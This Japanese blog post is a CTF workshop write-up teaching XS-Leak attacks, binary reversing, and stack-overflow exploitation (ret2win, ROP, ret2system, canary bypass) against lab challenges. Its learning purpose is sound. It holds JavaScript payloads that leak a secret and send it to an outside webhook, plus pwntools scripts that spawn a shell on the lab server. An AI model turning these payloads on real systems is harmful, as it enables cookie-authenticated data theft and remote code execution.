---
title: "SECCON 14 Beginners Workshop Write-up"
emoji: "🔐"
type: "tech"
topics: ["CTF", "pwn", "security", "reversing"]
published: true
---

![代替テキスト](https://www.seccon.jp/2022/assets_c/2022/05/beginners-thumb-448x300-1-thumb-448x300-348.jpg)

# はじめに

先週のSECCON Begginers WorkshopでたくさんCTFを学んできたので、この記事ではCTFプレイヤーたるもの、そのWrite-upに挑戦してみようと思います。

CTFに慣れた方にとっては見るに耐えないような初歩的な部分から文章にまとめていますが、どうか温かい目で見守ってください。

SECCON（セックコン）とは、日本最大級のサイバーセキュリティ競技イベントで、主に CTF（Capture The Flag） というハッキング競技を中心に開催される大会です。

[SECCON14公式サイト](https://www.seccon.jp/14/)


# Web編　〜XS-Leakをマスターしよう

作問者：shioさん（https://x.com/shiosa1t?s=20）

**Cross-Site Leak（XS-Leak）** は、ブラウザのサイドチャネルを利用して、直接読めない情報を間接的に推測する攻撃手法です。（ブラウザのサイドチャネル攻撃）

ブラウザには、Same-Origin Policy（SOP）やCSP（Content Security Policy）といったセキュリティ機能があり、不正なスクリプトの実行を制限することでXSSなどの攻撃を防いでいます。しかし、XS-Leakはスクリプトの実行そのものを目的とした攻撃ではなく、ブラウザの挙動の違いから情報を推測する手法であるため、SOPやCSPだけでは防ぐことができません。

通常のXSS攻撃とは違い、レスポンスの**中身**を盗むのではなく、「200か404か」「速いか遅いか」といった**外側の特徴**から情報を推測します。

- オリジン
    
    `スキーム + ホスト + ポート` の組み合わせ。
    
    例：`http://localhost:7000` と `http://localhost:7001` はポートが違うので別オリジン。

- SOP（Same-Origin Policy）
    
    別オリジンへのリソースアクセスを制限するブラウザのポリシー

- CSP（Content Security Policy）

    Webページが読み込んでよいスクリプトやリソースの取得元を制限し、不正なコードの実行を防ぐブラウザのセキュリティ機能。

### このCTF問題の構成

2つのWebサービスが動作しています。

- app  (port 7000)  ← フラグを持つWebアプリ
- bot  (port 7001)  ← 管理者として動くブラウザ

ボットは
1. `user=admin` の cookie をセット
2. 攻撃者が送ったHTMLを開く

このような流れで、攻撃者は管理者のブラウザに任意のJavaScriptを実行させることができます。（同一オリジンなので SOP の制限なしで `fetch` してレスポンスを自由に読めます。）

## XS-Leak：error（ステータスコードオラクル）

### この問題のポイント

```js
if (flag.includes(q)) {
    res.writeHead(200);   // ヒット → 200
} else {
    res.writeHead(404);   // ミス  → 404
}
```

フラグに検索文字列が含まれるかどうかでHTTPステータスコードが変わる。

### 攻撃手法

1文字ずつ前方一致で絞り込む：

```
fetch('/app/search?q=ctf4b{a') → 404 (miss)
fetch('/app/search?q=ctf4b{b') → 404 (miss)
...
fetch('/app/search?q=ctf4b{f') → 200 (hit!) → フラグは "ctf4b{f..." から始まる
fetch('/app/search?q=ctf4b{fl') → 200 (hit!)
...
```

### ペイロード（flagを取るために作る入力）

```html
<script>
const CALLBACK = 'https://webhook.site/YOUR-ID';
const CHARS = 'abcdefghijklmnopqrstuvwxyz0123456789_}';

async function findNextChar(prefix) {
    // 全候補を並列チェック（ステータスコードは並列OK）
    const results = await Promise.all(
        CHARS.split('').map(async (c) => {
            const res = await fetch('/app/search?q=' + encodeURIComponent(prefix + c), {
                credentials: 'include'
            });
            return { c, hit: res.status === 200 };
        })
    );
    return results.find(r => r.hit)?.c ?? null;
}

async function leak() {
    let flag = 'ctf4b{';
    while (!flag.endsWith('}')) {
        const next = await findNextChar(flag);
        if (!next) break;
        flag += next;
    }
    await fetch(CALLBACK + '?flag=' + encodeURIComponent(flag));
}

leak();
</script>
```



## XS-Leak：timing（タイミングオラクル）

### この問題のポイント

```js
if (flag.includes(q)) {
    heavyWork(200);      // ← 200ms CPU処理でわざと遅延
    res.writeHead(200);  // ステータスは常に 200
} else {
    res.writeHead(200);  // ステータスは常に 200
}
```

**ヒットもミスも HTTP 200** → ステータスコードでは区別できない。
代わりに**応答時間の差**（ヒット約200ms、ミス約3ms）を利用する。

### ハマりポイント3つ

#### ① 並列リクエストは使えない

Node.jsはシングルスレッドのため、ヒットのリクエストがCPUをブロックすると、他のリクエストも全部待たされる

```
並列で送ると：
  ctf4b{ta → ヒット → heavyWork(200ms)でCPUブロック
  ctf4b{tb → 本来3msのはずが 200ms 待たされる → 偽ヒット！
  ctf4b{tc → 本来3msのはずが 200ms 待たされる → 偽ヒット！
  → 全部がヒットに見えてしまう
```

→ 1文字ずつ直列で測定する必要がある。

#### ② 固定閾値は不安定

環境によって応答時間が変わるので `100ms以上ならヒット` などの固定値では誤判定が起きやすい。

→ 実測値からキャリブレーションして動的に閾値を決める。

```js
const hitMs  = await measure('ctf4b{');    // 必ずヒット → 約200ms
const missMs = await measure('XXXXXXXX');  // 必ずミス → 約3ms
const threshold = (hitMs + missMs) / 2;    // 中間値を閾値にする
```

#### ③ ボットのタイムアウトを意識する

ボットの待機時間は20秒。`REPEAT=3` などで繰り返し測定すると時間切れになる。

| 設定 | 所要時間 |
|------|---------|
| REPEAT=3 + 途中送信あり | 約20秒（ギリギリ） |
| REPEAT=1 + 最後に1回送信 | 約6秒（余裕） |

→ 繰り返し測定は最小限に、送信も最後に1回だけ。

### ペイロード

```html
<script>
const CALLBACK = 'https://webhook.site/YOUR-ID';
const CHARS = 'abcdefghijklmnopqrstuvwxyz0123456789_}';

async function measure(query) {
    const start = Date.now();
    await fetch('/app/search?q=' + encodeURIComponent(query), {
        credentials: 'include'
    });
    return Date.now() - start;
}

async function calibrate() {
    const hitMs  = await measure('ctf4b{');   // 必ずヒット
    const missMs = await measure('XXXXXXXX'); // 必ずミス
    return Math.round((hitMs + missMs) / 2);  // 動的閾値
}

async function findNextChar(prefix, threshold) {
    for (const c of CHARS) {
        if (await measure(prefix + c) > threshold) return c;  // 直列で測定
    }
    return null;
}

async function leak() {
    const threshold = await calibrate();

    let flag = 'ctf4b{';
    while (!flag.endsWith('}')) {
        const next = await findNextChar(flag, threshold);
        if (!next) break;
        flag += next;
    }

    await fetch(CALLBACK + '?flag=' + encodeURIComponent(flag));  // 最後に1回だけ送信
}

leak();
</script>
```

# Reversing編　〜Ghidraを使ってみよう

- 作問者：JUCKさん
- [作問者 Write-up](https://zenn.dev/juck28/articles/596bafad027a93)

Reversingとは、バイナリ（コンパイル済みの実行ファイル）を逆方向に解析して、プログラムの動作やフラグを見つける分野です。


ソースコードが与えられないことが多く、GhidraやCyberChefなどの逆アセンブラ/デコンパイラを使ってCコードに戻して読みます。


- https://github.com/NationalSecurityAgency/ghidra
- https://gchq.github.io/CyberChef/


## strcmp_basic

ソースを読むと `check_password()` の中に正解がそのまま書いてある。


## hidden_flag

`strings` を実行すると断片が出てくる。

```
ctf4b{stH
r1ngs_c0H
mm4nd_isH
_p0w3rfuH
```

この `H` はフラグの一部ではなく、次の命令の **REX.W プレフィックス（0x48）** がprintable文字として混入しているだけ。

```bash
$ strings hidden_flag | grep "ctf4b" -A4
ctf4b{st
r1ngs_c0
mm4nd_is
_p0w3rfu
ul}
```


## reverse_string

「Something is backwards...」というヒントがある。
プログラムを実行すると意味不明な文字列が出てくる。

Ghidraでデコンパイルすると、スタック変数にこんな値が入っている。

```c
local_28 = 0x7233763373346c7d;
local_20 = 0x7472316e675f;
uStack_1a = 0x7b73;
uStack_18 = 0x6374663462;
```

これはASCII文字をそのまま16進数に詰めたものである。16進数は 2桁 = 1バイト。0x637466346を右から2桁ずつ区切ると63 74 66 34 62なので、これをASCIIに変換します。

- 63	c
- 74	t
- 66	f
- 34	4
- 62	b

つまり「ctf4b」になります。そしてx86-64（64ビットCPUの設計）は**リトルエンディアン**（数値の小さい桁が先頭）なので、バイト順を逆にして読みます。

| 変数 | メモリ上の文字 |
|------|---------------|
| `local_28` | `}l4s3v3r` |
| `local_20` | `_gn1rt` |
| `uStack_1a` | `s{` |
| `uStack_18` | `b4ftc` |

最後にこの出力を逆順に読むと

```python
s = "}l4s3v3r_gn1rts{b4ftc"
print(s[::-1])
# → ctf4b{str1ng_r3v3s4l}
```
## split_flag

`strings` で断片を収集してアドレス順に繋げる：

```bash
$ strings split_flag
...
ctf4b{
spl1t_
fl4g_
p4rts}
```

## function_chain

stripされているため関数名が見えない。フラグが複数の関数に分割されていて、チェーン状に呼ばれる。

`strings` で断片を発見

```bash
$ strings function_chain
_ch41n}
funct10n
ctf4b{
Flag parts are scattered across functions!
```

`strings` の結果を実行順に繋げる

## multiple_strings

`hidden_flag` と同じ `movabs` 即値隠蔽を使いつつ、**偽フラグを複数埋め込んで**惑わせる問題。

`strings` を実行すると4種類出てくる

| 断片 | 組み立て後 | 本物？ |
|------|-----------|--------|
| `fake{thi` + `s_is_not` + ... | `fake{this_is_not_the_flag}` | 偽（形式が違う） |
| `ctf{almo` + `st_but_n` + ... | `ctf{almost_but_not_quite}` | 偽（形式が違う） |
| `ctf4b{gr` + `3p_p4tt3` + ... | `ctf4b{gr3p_p4tt3rn_m4st3r}` | **本物** |
| `flag{nic` + `ce_try}` | `flag{nice_try}` | 偽（形式が違う） |

`grep` で正しい形式 `ctf4b{` に絞り込む：

```bash
$ strings multiple_strings | grep "ctf4b{"
```

フラグ内の `gr3p_p4tt3rn_m4st3r`（= "grep pattern master"）が、そのまま解法のヒントになっている。

## xor_simple


XOR（排他的論理和）は同じビットなら `0`、違うビットなら `1` になるビット演算。
フラグを XOR で暗号化してスタックに格納していく。ヒントに「XOR key is 0x42」とある。


```
A ^ K ^ K == A   （同じkeyで2回XORすると元に戻る）
```

つまりXOR（排他的論理和）は暗号化と復号が全く同じ。

Ghidraでデコンパイルするとスタック変数にXOR済みバイト列が見える：

```c
local_28 = 0x723a392076243621;
local_20 = 0x3471301d31731d30;
local_18 = 0x3f712e2073313071;
```

リトルエンディアン変換してから `0x42` でXOR：

```python
import struct

encrypted = [
    0x723a392076243621,
    0x3471301d31731d30,
    0x3f712e2073313071,
]

key = 0x42
flag = ""

for val in encrypted:
    raw = struct.pack("<Q", val)   # リトルエンディアンで8バイト展開
    for b in raw:
        flag += chr(b ^ key)       # XORで復号

print(flag)
# → ctf4b{x0r_1s_r3v3rs1bl3}
```

## xor_shift

フラグに **XOR** と **nibble swap（4ビットシフト）** の2段階暗号化を施して出力する。

Ghidraでデコンパイルすると処理が見える：

```c
uVar1 = XOR(local_48[local_4c]);   // Step 1: XOR(0xAA)
bVar2 = SHIFT4(uVar1);             // Step 2: nibble swap
printf("%02x", bVar2);
```

**nibble swap** とは1バイトの上位4ビットと下位4ビットを入れ替える操作

```c
uint SHIFT4(byte param_1) {
    return (uint)(param_1 >> 4) | (uint)param_1 << 4;
}
```

XORもnibble swapも**自己逆元**（同じ操作を2回すると元に戻る）なので、逆順で同じ操作を適用するだけ

```python
def nibble_swap(b):
    return ((b >> 4) | (b << 4)) & 0xFF

def decrypt(hex_str):
    result = ""
    for i in range(0, len(hex_str), 2):
        b = int(hex_str[i:i+2], 16)
        b = nibble_swap(b)   # Step 2を逆に
        b = b ^ 0xAA         # Step 1を逆に
        result += chr(b)
    return result
```

Ghidraのデコンパイル結果に平文フラグがそのまま現れている

```c
builtin_strncpy(local_48, "ctf4b{XOR_stream_bitshift}", 0x1b);
```

# Pwn編　〜CPUのお気持ちを汲み取る

作問者：ham4noさん（https://x.com/ham4no）

バイナリの脆弱性を突いてプログラムの制御を乗っ取り、フラグを取得する分野です。

### 基礎知識：レジスタ

レジスタとは CPU 内部にある超高速な記憶領域。メモリより格段に速く、計算結果や重要なアドレスを一時的に保持する。

引数渡しに使うレジスタ（x86-64）

| レジスタ | 役割 |
|---------|------|
| `rdi`   | 第1引数 |
| `rsi`   | 第2引数 |
| `rdx`   | 第3引数 |
| `rcx`   | 第4引数 |
| `r8`    | 第5引数 |
| `r9`    | 第6引数 |

**特殊レジスタ**

| レジスタ | 役割 |
|---------|------|
| `rsp`   | スタックポインタ。スタックの先端を指す |
| `rbp`   | ベースポインタ。スタックフレームの底を指す |
| `rip`   | インストラクションポインタ。次に実行する命令のアドレス |

`rip` は「今どこを実行中か」を示すレジスタ。pwn の目標はこいつを乗っ取ることと言っても過言ではない。

x86-64 Linux では関数の引数は**レジスタで渡される**（System V AMD64 ABI）。
`win(0x1337)` を呼びたければ、呼び出し前に `rdi = 0x1337` をセットしておく必要がある。

### 基礎知識：スタックの構造

スタックは関数の呼び出し情報やローカル変数を管理するメモリ領域。

```
高アドレス
  ┌──────────────┐
  │   古いデータ 　│  ← 先にpushされたもの
  ├──────────────┤
  │  新しいデータ  │  ← 後にpushされたもの  ← rsp（先端）
  └──────────────┘
低アドレス（番号が小さいアドレス）      
```
プログラム実行中：
```
main() 開始
↓
vuln() 呼び出し
↓
win() 呼び出し
```
このとき、

```
高アドレス
┌──────────────────┐
│ main のフレーム 　 │ ← main用の作業領域
├──────────────────┤
│ vuln のフレーム  　│ ← 今ここ実行中
├──────────────────┤
│ win のフレーム   　│ ← 呼ばれたら追加
└──────────────────┘
低アドレス（番号が小さいアドレス）      
```
↑ 大きくみるとこんな感じになっていて

↓ vuln のとこだけさらに拡大

```
高アドレス
  ┌──────────────────────┐
  │   main のフレーム   　 │  
  │   ...                │
  ├──────────────────────┤
  │  Return Address      │  call func が push
  ├──────────────────────┤
  │  Saved RBP           │  push rbp で push
  ├──────────────────────┤
  │  ローカル変数 (buf)    │  sub rsp, N で確保
  ├──────────────────────┤
低アドレス（番号が小さいアドレス）      
```

| 要素 | 役割 |
|------|------|
| **Return Address** | 関数終了後に戻る先のアドレス（`call` の次の命令） |
| **Saved RBP** | 呼び出し元の rbp。関数終了時に復元される |
| **ローカル変数** | `char buf[32]` などの関数内変数 |

### 基礎知識：スタックバッファオーバーフロー

`gets()` のように入力サイズを制限しない関数に長すぎる入力を渡すと、バッファを溢れてリターンアドレスまで上書きできてしまう。オーバーフローの方向については、スタックの成長方向と逆になる。

```
高アドレス
  ┌──────────────────────┐
  │   main のフレーム   　 │  
  │   ...                │
  ├──────────────────────┤
  │  Return Address      │  自由に書き換えられる！
  ├──────────────────────┤
  │  Saved RBP           │  A × 8 で上書きされる
  ├──────────────────────┤
  │  ローカル変数 (buf)    │  A × 32 で埋まる
  ├──────────────────────┤
低アドレス（番号が小さいアドレス）      
```

何バイト送ればリターンアドレスに届くか（オフセット）

```
buf(32 bytes) + Saved RBP(8 bytes) = 40 bytes
```

### 基礎知識：ROPとガジェット

Return Addressを奪取できたら、次はReturn Addressを書き換えていきます。

現代のバイナリにはNX（Non-Executable Stack）という保護があり、スタック上のコードを直接実行できません。そこで使われるのが ROP（Return Oriented Programming） です。

### 基礎知識：ガジェット

**バイナリ（実行ファイル）** とは、`./chall` のようなコンパイル済みの実行ファイルのことです。中身はCPUが直接実行する機械語（バイト列）で、すべての関数・命令が詰まっています。

すべての関数は最後に `ret` 命令（バイト値 `0xc3`）で終わるため、バイナリ全体に `ret` が大量に散らばっています。その直前の命令が `pop rdi` であれば、そこへジャンプするだけで `pop rdi; ret` という命令列として使えます。これが**ガジェット**です。

```asm
; よく使うガジェット例
pop rdi; ret   ← スタックの先端の値を取り出して rdi に入れ、ret で次へ
pop rsi; ret   ← 同様に rsi への設定
ret            ← 何もせず次のアドレスへ（スタック調整に使用）
```

### 基礎知識：ガジェットの繋ぎ方

BOF でスタックに値を並べておくと、`ret` が実行されるたびに rsp が 8 進んで次の値が実行アドレスになります。`pop rdi; ret` ガジェットを使って `win(0x1337)` を呼び出す例

```
高アドレス
  ┌──────────────────────┐
  │   main のフレーム   　 │  win() のアドレス
  │   ...                │  0x1337 （rdi に 0x1337 がセット）
  ├──────────────────────┤
  │  Return Address      │  pop rdi; ret のAddress
  ├──────────────────────┤
  │  Saved RBP           │  A × 8 で上書き
  ├──────────────────────┤
  │  ローカル変数 (buf)    │  A × 32 で埋める
  ├──────────────────────┤
低アドレス（番号が小さいアドレス）      
```

ポイントは スタックの中身は BOF で書き換え、ガジェットはその値をレジスタに取り込む役割を担う点です。`ret` のたびに rsp が高アドレス方向へ進み、次の命令列へ連鎖していきます。mainのフレームを一部壊しますが、もうmainに戻らないので関係ないです。これが ROP（Return Oriented Programming）と呼ばれます。

### 基礎知識：セキュリティ機構の確認コマンド

問題バイナリを受け取ったら最初に確認する：

```bash
$ checksec chall
```

| 項目 | 意味 |
|------|------|
| `Canary` | スタック破壊検知。有効なら値をリークする必要がある |
| `NX` | スタック上のコード実行禁止。有効ならROP等が必要 |
| `PIE` | アドレスのランダム化。有効ならアドレスリークが必要 |

---

## Challenge 1：バッファオーバーフロー入門（key書き換え）


バッファに長い文字列を入力して、隣の変数 `key` を書き換えるとフラグが表示される。
リターンアドレスを書き換えるのではなく、**変数の値**を書き換えるだけの入門問題。

### ソースコード

```c
int main(void) {
    long key = -1;
    char buf[40] = {0};

    puts("Step 1: overflow the buffer.");

    puts("\n--- Stack Before Input ---");
    dump_stack(buf, 8);   // buf[i=0], ..., key[i=5], Saved RBP[i=6], RetAddr[i=7]

    printf("\nInput: ");
    scanf("%s", buf);     // ← サイズチェックなし！

    if (key != -1) {
        puts("overflow!");
        print_flag();     // フラグ表示
    } else {
        puts("Try again.");
    }
    return 0;
}
```

`dump_stack(buf, 8)` でスタックの構造を覗いてみる。

```
[0x7ffe...c5a0] 0x0000000000000000 <- buf
[0x7ffe...c5a8] 0x0000000000000000
[0x7ffe...c5b0] 0x0000000000000000
[0x7ffe...c5b8] 0x0000000000000000
[0x7ffe...c5c0] 0x0000000000000000
[0x7ffe...c5c8] 0xffffffffffffffff <- key
[0x7ffe...c5d0] 0x00007ffe...c660  <- Saved RBP
[0x7ffe...c5d8] 0x0000...f91fa1ca  <- Return Address
```

`key = -1` は16進数で `0xFFFFFFFFFFFFFFFF`。これを別の値に書き換えればフラグが出る。

### 攻撃の流れ

`scanf("%s", buf)` は空白文字（スペース・改行）が来るまで読み込み続ける。
サイズ制限がないため、40バイト以上の入力でオーバーフローさせられる。

- buf[0..39]：40バイト（バッファを埋める）
- buf[40..47]：key の領域（-1 以外の値を書く）

**必要なのは 41バイト以上の入力**。41バイト目以降が `key` に書き込まれ、-1 でなくなればOK。

### ペイロード

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*41)' | nc 153.127.195.223 9001
```

### 入力後のスタック

```
[0x7ffe...c5a0] 0x4141414141414141 <- buf   ← "AAAA..."
[0x7ffe...c5a8] 0x4141414141414141
[0x7ffe...c5b0] 0x4141414141414141
[0x7ffe...c5b8] 0x4141414141414141
[0x7ffe...c5c0] 0x4141414141414141
[0x7ffe...c5c8] 0x0000000000000041 <- key   ← 0x41（'A'）に書き換わった！
```

`key = 0x41`（= 65）≠ -1 なので条件を通過し、フラグが表示される。


## Challenge 2：ret2win（基本）

`gets()` という危険な関数（サイズチェックなし）が使われており、`win()` という「フラグを表示する関数」が存在する。
**目標：** リターンアドレスを `win()` のアドレスに書き換えて、フラグを得る。

### ソースコード

```c
void win() {
    char buf[100];
    FILE *f = fopen("./flag.txt", "r");
    fgets(buf, 100, f);
    puts(buf);
}

int main() {
    char buf[32] = {0};

    printf("Challenge 2\n");
    dump_stack(buf, 6);

    printf("\nInput: ");
    gets(buf);    // ← 危険！サイズチェックなし

    dump_stack(buf, 6);
    printf("\nBye!\n");
    return 0;
}
```

### セキュリティ確認

```bash
$ checksec chall
Canary : No     ← スタック保護なし（オーバーフローし放題）
NX     : Yes    ← シェルコード直接実行は不可
PIE    : No     ← アドレス固定（win()のアドレスが毎回同じ）
```

### Step 1：win() のアドレスを確認

```bash
$ nm chall | grep win
00000000004013c4 T win
```

win() のアドレス = `0x4013c4`。リターンアドレスをこれに書き換えたい。

### Step 2：オフセット計算

スタック構造（x86-64）：

```
buf (32 bytes) + Saved RBP (8 bytes) = 40 bytes
```

40バイト書いた後がリターンアドレス。

### Step 3：ペイロード作成

アドレスはリトルエンディアンで書き込む必要がある（小さい桁が先頭）

```python
# 0x4013c4 をリトルエンディアンで表現
p64(0x4013c4)  # → b"\xc4\x13\x40\x00\x00\x00\x00\x00"
```

```bash
python3 -c 'import sys; sys.stdout.buffer.write(
    b"A"*40 + b"\xc4\x13\x40\x00\x00\x00\x00\x00"
)' | nc 153.127.195.223 9002
```


## Challenge 3：引数付きret2win（ROP入門）


`win()` 関数が存在するが、**引数 `magic` が `0x1337` でないと動かない**。
`gets()` でオーバーフローさせるのは同じだが、RDI レジスタに引数をセットする必要がある。

### ソースコード

```c
void gadgets() {
    __asm__("pop %rdi; ret");   // ← ROPガジェット！
}

void win(int magic) {
    char buf[100];
    if (magic == 0x1337) {
        printf("Magic matched!\n");
        FILE *f = fopen("./flag.txt", "r");
        fgets(buf, 100, f);
        puts(buf);
    } else {
        printf("Wrong magic... Expected 0x1337, but got 0x%x\n", magic);
        exit(1);
    }
}

int main() {
    char buf[32] = {0};
    printf("Challenge 3\n");
    dump_stack(buf, 6);
    printf("\nInput: ");
    gets(buf);    // ← 危険！
    dump_stack(buf, 6);
    printf("\nBye!\n");
    return 0;
}
```

### ガジェットのアドレスを探す

```bash
$ objdump -d chall | grep -A1 "pop.*rdi"
4013ec:  5f          pop    %rdi
4013ed:  c3          ret
```

`pop rdi; ret` ガジェットのアドレス = `0x4013ec`

### win() のアドレスを確認

```bash
$ nm chall | grep win
00000000004013f1 T win
```

win() のアドレス = `0x4013f1`

### ペイロード

```bash
python3 -c 'import sys; sys.stdout.buffer.write(
    b"A"*40
    + b"\xec\x13\x40\x00\x00\x00\x00\x00"   # pop rdi; ret (0x4013ec)
    + b"\x37\x13\x00\x00\x00\x00\x00\x00"   # magic = 0x1337
    + b"\xf1\x13\x40\x00\x00\x00\x00\x00"   # win() (0x4013f1)
)' | nc 153.127.195.223 9003
```

## Challenge 4：ret2system

### 問題概要

`win()` 関数がない。`NX` が有効でシェルコードは使えない。
でもプログラムが `system()` のアドレスと `"/bin/sh"` のアドレスを教えてくれる（Gift）。

### ソースコード

```c
void gadgets() {
    __asm__("pop %rdi; ret");
    __asm__("ret");
}

int main() {
    char buf[32] = {0};

    printf("Challenge 4\n");
    printf("There is no win() function here.\n\n");

    // ★ ASLR があっても実行時アドレスを教えてくれる（Gift）
    printf("Gift 1 (system): %p\n", system);
    printf("Gift 2 (/bin/sh): %p\n", "/bin/sh");

    dump_stack(buf, 6);
    printf("\nInput: ");
    gets(buf);   // ← 危険！
    dump_stack(buf, 6);
    printf("\nBye!\n");
    return 0;
}
```

### 前提知識

**NX（No eXecute）：** スタック上のデータを命令として実行できない保護。シェルコードが使えなくなる。

**ASLR（Address Space Layout Randomization）：** ライブラリのロードアドレスを実行のたびにランダム化するOS機能。`system()` のアドレスが毎回変わる。
→ 今回はプログラムがアドレスを表示してくれるため突破できる。

### セキュリティ確認

```
Canary : なし  → スタック破壊検知がない（オーバーフローし放題）
NX     : あり  → シェルコードは使えない → ROP が必要
PIE    : なし  → バイナリ内アドレスが固定（ガジェットアドレスが変わらない）
```

### スタックレイアウトとオフセット

```
buf(32 bytes) + Saved RBP(8 bytes) = 40 bytes → リターンアドレス
```

### ROPチェーンの設計

`system("/bin/sh")` を呼ぶには RDI に `"/bin/sh"` のアドレスをセットする必要がある。


```
高アドレス
  ┌──────────────────────┐
  │   main のフレーム   　 │  system() のアドレス
  │   ...                │  ret のアドレス（スタックアライメント）
  │   ...                │  "/bin/sh" のアドレス
  ├──────────────────────┤
  │  Return Address      │  pop rdi; ret のAddress
  ├──────────────────────┤
  │  Saved RBP           │  A × 8 で上書き
  ├──────────────────────┤
  │  ローカル変数 (buf)    │  A × 32 で埋める
  ├──────────────────────┤
低アドレス（番号が小さいアドレス）      
```

> **スタックアライメントについて：**
> x86-64では関数呼び出し時にRSPが16バイト境界に揃っている必要がある。余分な `ret` を挟んでこれを調整する。

### エクスプロイトコード

```python
from pwn import *

POP_RDI_RET = 0x000000000040138c   # pop rdi; ret（固定アドレス）
RET         = 0x000000000040101a   # ret（アライメント用）

p = remote("153.127.195.223", 9004)

# ① Gift からアドレスを受け取る（ASLR対策）
p.recvuntil(b"Gift 1 (system): ")
system_addr = int(p.recvline().strip(), 16)

p.recvuntil(b"Gift 2 (/bin/sh): ")
binsh_addr = int(p.recvline().strip(), 16)

print(f"[+] system   @ {hex(system_addr)}")
print(f"[+] /bin/sh  @ {hex(binsh_addr)}")

p.recvuntil(b"Input: ")

# ② ペイロード構築
payload  = b"A" * 32           # buf を埋める
payload += b"B" * 8            # Saved RBP
payload += p64(POP_RDI_RET)    # pop rdi; ret
payload += p64(binsh_addr)     # RDI = "/bin/sh"
payload += p64(RET)            # アライメント
payload += p64(system_addr)    # system("/bin/sh")

p.sendline(payload)

# ③ シェルが起動したらフラグを取得
p.recvuntil(b"Bye!\n")
p.sendline(b"cat flag.txt")
p.sendline(b"exit")
print(p.recvall(timeout=5).decode())
```

### 実行結果

```
[+] system   @ 0x73651b234750
[+] /bin/sh  @ 0x4020e7

flag{y0u_d0nt_need_w1n_func!}
```

### この問題から学べること

-  **`gets()` は絶対に使ってはいけない**：サイズチェックがなく、必ずオーバーフローの原因になる
-  **NX があってもROPで回避できる**：ガジェットはバイナリ内に必ず存在する
-  **ASLRはリークで突破できる**：アドレスが1つでも漏れると ASLR の意味がなくなる

## Challenge 5：スタックカナリアバイパス

ret2win 問題だが、**スタックカナリア** が追加されている。
ただしプログラムが入力前にスタックの中身を表示してくれる（カナリアがリークされる）。

### ソースコード

```c
void win() {
    char buf[100];
    FILE *f = fopen("./flag.txt", "r");
    fgets(buf, 100, f);
    puts(buf);
}

int main() {
    char buf[40] = {0};

    printf("Challenge 5\n");

    printf("\n--- Stack Before Input ---\n");
    dump_stack(buf, 8);   // ← 入力前にカナリアが見える！

    printf("\nInput: ");
    gets(buf);

    dump_stack(buf, 8);
    printf("\nBye!\n");
    return 0;
}
```

### 前提知識：スタックカナリア

バッファオーバーフローを検知するための保護機構。

名前の由来は「炭鉱のカナリア」。炭鉱夫はガス検知のためにカナリアを連れて入坑した。ガスが充満するとカナリアが先に倒れ、危険を察知できた。スタックカナリアも同様に「改ざんを早期検知する番犬」として機能する。

- 関数の最初にランダムな値（カナリア）を挿入
- `return` の直前にカナリアが変わっていないか確認
- 変わっていたら `abort()` で強制終了

**カナリアの特徴：**
- 最下位バイトは必ず `\x00`（文字列関数でリークしにくくする）
- 毎回の起動でランダムな値

### スタックレイアウトの確認

```
[0x7ffe...2b20] 0x0000000000000000 <- buf
[0x7ffe...2b28] 0x0000000000000000
[0x7ffe...2b30] 0x0000000000000000
[0x7ffe...2b38] 0x0000000000000000
[0x7ffe...2b40] 0x0000000000000000
[0x7ffe...2b48] 0x028f1c43dee05e00 <- ?   ← カナリアがここに！
[0x7ffe...2b50] 0x00007ffe...2c00  <- Saved RBP
[0x7ffe...2b58] 0x0000...f91fa1ca  <- Return Address
```

`<- ?` と表示されているのがカナリア。値を読み取ればバイパスできる。

### ペイロードの設計

普通にオーバーフローすると：
```
[AAAA...×40] [AAAA×8 ← カナリア破壊！] → abort()
```

カナリアを正しい値で書き込むと：
```
[AAAA...×40] [カナリアの値] [BBBB×8] [RET][win()アドレス] → チェック通過！
```

リターンアドレスまでのオフセット：
```
buf(40 bytes) + canary(8 bytes) + Saved RBP(8 bytes) = 56 bytes → リターンアドレス
```

つまり、
```
高アドレス
  ┌──────────────────────┐
  │   main のフレーム   　 │  
  │   ...                │  win() のアドレス
  ├──────────────────────┤
  │  Return Address      │  ret のAddress
  ├──────────────────────┤
  │  Saved RBP           │  A × 8 で埋める
  ├──────────────────────┤
  │　カナリア 　           │  カナリアのアドレス
  ├──────────────────────┤
  │  ローカル変数 (buf)    │  A × 32 で埋める
  ├──────────────────────┤
低アドレス（番号が小さいアドレス）      
```

### エクスプロイトコード

```python
from pwn import *

WIN = 0x000000000040143a   # win() アドレス（PIE無しで固定）
RET = 0x000000000040101a   # ret ガジェット（アライメント用）

p = remote("153.127.195.223", 9005)

# ① 入力前のスタックダンプからカナリアをリーク
p.recvuntil(b"--- Stack Before Input ---\n")

canary = None
for _ in range(8):
    line = p.recvline()
    if b"<- ?" in line:
        canary = int(line.split(b"]")[1].split()[0], 16)
        print(f"[+] Canary leaked: {hex(canary)}")

p.recvuntil(b"Input: ")

# ② ペイロード構築
payload  = b"A" * 40       # buf[40] を埋める
payload += p64(canary)     # カナリアを正しい値で上書き（壊さない！）
payload += b"B" * 8        # Saved RBP（何でもよい）
payload += p64(RET)        # スタックアライメント
payload += p64(WIN)        # win() へジャンプ

# ③ 送信
p.sendline(payload)

# ④ フラグを受け取る
output = p.recvall(timeout=5)
print(output.decode())
```

### 実行結果

```
[+] Canary leaked: 0x28f1c43dee05e00

--- Stack After Input ---
[0x7ffe...2b20] 0x4141414141414141 <- buf
[0x7ffe...2b28] 0x4141414141414141
[0x7ffe...2b30] 0x4141414141414141
[0x7ffe...2b38] 0x4141414141414141
[0x7ffe...2b40] 0x4141414141414141
[0x7ffe...2b48] 0x028f1c43dee05e00 <- ?    ← カナリアは無傷！
[0x7ffe...2b50] 0x4242424242424242 <- Saved RBP
[0x7ffe...2b58] 0x000000000040101a <- Return Address

Bye!
flag{7h1s_is_canary}
```

# さいごに

ここまでお読みいただき、ありがとうございました。今まで私はweb系の技術に多く触れてきていましたが、こうしてCTFを広く浅く学んでみると、pwn（低レイヤ）ってめちゃくちゃ面白いです。これからCTFの問題をたくさん解いて、来年はSECCONの舞台に立てるといいなぁ。

私の理解に間違っている部分があれば、ぜひコメントで指摘いただけると幸いです。